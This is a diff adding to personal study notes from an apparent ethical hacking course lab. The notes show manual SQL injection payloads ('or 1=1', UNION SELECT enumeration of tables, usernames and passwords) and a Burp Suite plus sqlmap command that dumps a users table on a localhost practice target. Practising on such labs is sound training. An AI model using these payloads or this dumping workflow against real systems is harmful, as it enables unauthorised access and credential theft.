@@ -1979,3 +1979,54 @@ use [[cheet#sqlmap]]
 
 #### Injection 0x03
  goal -->  find admin password
+##### Manually
+ if we type random string --> doesn't return anything
+ =>
+<span style="background:#fff88f"> test if webserver is vulnerable:</span>
+ `randomString' or 1=1#`
+ if it returns something => it's vulnerable (this is the case)
+ 
+if we search a product => we find his description
+=>
+let's try to use [[Notes_ETH#Union|union]] -->  to find tables and maybe passwords
+=>
+<span style="background:#fff88f">first find the number of column that we need:</span>
+`Senpai Knife Set' union select null,null,null,null#`
+<span style="color:#00b050">with 4 null we found something</span>
+![[Pasted image 20240307164349.png]]
+
+=>
+<span style="background:#fff88f">let's find the tables:</span>
+`Senpai Knife Set' union select null,null,null,table_name from information_schema.tables#`
+![[Pasted image 20240307163129.png]]
+
+<span style="background:#fff88f">let's find usernames:</span>
+`Senpai Knife Set' union select null,null,null,username from injection0x03_users#`
+<span style="color:#00b050">we found an username</span> -->  takeshi
+>[!example]
+>if we don't know the column name
+>=>
+>we can:
+>- guess it
+>- enumerate it
+
+
+
+<span style="background:#fff88f">let's find passwords:</span>
+`Senpai Knife Set' union select null,null,null,password from injection0x03_users#`
+<span style="color:#00b050">we found a password</span> -->  onigirigadaisuki
+
+<span style="color:#00b050">finish :)</span>
+
+##### sqlmap and BurpSuite
+- enable foxyproxy
+- click on Target > Scope Settings > Add > `http://localhost` > Ok > Yes
+- click on one of the POST request
+- copy it
+- save it in a txt file and substitute the last with -->  `product=test`
+- `sqlmap -r req.txt -T injection0x03_users --dump`
+  ![[Pasted image 20240307171043.png]]
+
+
+
+### XSS
